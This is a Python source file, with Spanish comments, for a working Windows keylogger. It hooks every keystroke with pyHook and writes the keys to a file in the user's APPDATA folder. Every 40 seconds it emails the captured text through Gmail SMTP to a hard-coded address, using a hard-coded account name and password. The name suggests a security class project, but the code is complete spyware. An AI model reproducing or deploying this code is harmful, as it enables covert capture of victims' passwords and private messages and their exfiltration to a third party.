import pyHook, pythoncom, sys, logging, time, datetime, os, sys



def keysmtp():
	appdata =  os.getenv('APPDATA')
	carpeta_destino = appdata+'/keys_smtp.txt'
	segundos_espera = 40
	timeout = time.time()+ segundos_espera
	
	def TimeOut():
		if time.time()> timeout:
			return True
		else:
			return False

	def EnviarEmail():
		with open(carpeta_destino, 'r+') as f:
			fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
			data = f.read()
			data = data.replace('Space',' ')#Espacio
			data = data.replace('\n', '')#Saltos de linea
			data = data.replace('Lcontrol', '')#Control Izquierdo
			data = data.replace('Lshift', '')#Shift Izquierdo
			data = data.replace('Lwin', '')#Tecla Win Izquierda
			data = data.replace('Back', '')#Borrar
			data = data.replace('Tab', '')#Tab
			data = data.replace('Capital', '')#Bloq Mayus
			data = data.replace('Rshift', '')#Shift Derecho
			data = data.replace('Lmenu', '')#Alt Izquierdo
			data = data.replace('Left', '')#Izquierda
			data = data.replace('Right', '')#Derecha
			data = data.replace('Up', '')#Arriba
			data = data.replace('Down', '')#Abajo
			data = data.replace('Escape', '')#Abajo
			data = data.replace('Return', '\n')#Abajo
			data = 'Mensaje capturado a las: '+ fecha + '\n' + data
			print(data)
			crearEmail('seguridadproyecto4@gmail.com', 'seguridad12345', 'seguridadproyecto4@gmail.com', 'Nueva Captura: ' +fecha, data)
			f.seek(0)
			f.truncate()

	def crearEmail(user, passwd, recep, subj, body):
		import smtplib
		mailUser = user
		mailPass = passwd
		From = user
		To = recep
		Subject = subj
		Txt = body
		email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
		try:
			server = smtplib.SMTP("smtp.gmail.com",587)
			server.ehlo()
			server.starttls()
			server.login(mailUser, mailPass)
			server.sendmail(From, To, email)
			server.close()
			print('Correo enviado correctamente')
			time.sleep(2)
			os.system("cls")
		except:
			print('Correo fallido')

	def OnKeyboardEvent(event):
		logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
		print('WindowName:', event.WindowName)
		print('Window:', event.Window)
		print('Key:', event.Key)
		logging.log(10, event.Key)
		return True

	print("Registrando teclas...")
	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = OnKeyboardEvent
	hooks_manager.HookKeyboard()

	while True:
		if TimeOut():
			EnviarEmail()
			timeout = time.time()+ segundos_espera
		pythoncom.PumpWaitingMessages()
